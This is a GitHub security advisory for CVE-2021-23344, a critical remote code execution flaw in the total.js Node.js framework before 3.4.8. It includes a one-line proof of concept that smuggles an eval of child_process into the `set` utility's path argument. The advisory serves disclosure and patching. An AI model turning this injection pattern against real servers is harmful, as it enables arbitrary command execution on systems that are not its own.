# [C] total.js Remote Code Execution Vulnerability

## Summary
Severity: Critical
Advisory: GHSA-3wj8-vp9h-rm6m
CVE: CVE-2021-23344
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-03-19
Source: https://github.com/advisories/GHSA-3wj8-vp9h-rm6m
Type: github-advisory

## Affected
- npm: `total.js` — affected >=0 <3.4.8

## Details
total.js is a framework for Node.js platfrom written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) via `set`.

### PoC
```js
// To be run in a nodejs console: 
require('total.js/utils').set({}, 'a;eval(`require("child_process")\\x2eexecSync("touch pwned")`);//')
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-23344
- https://github.com/totaljs/framework/commit/c812bbcab8981797d3a1b9993fc42dad3d246f04
- https://snyk.io/vuln/SNYK-JS-TOTALJS-1077069
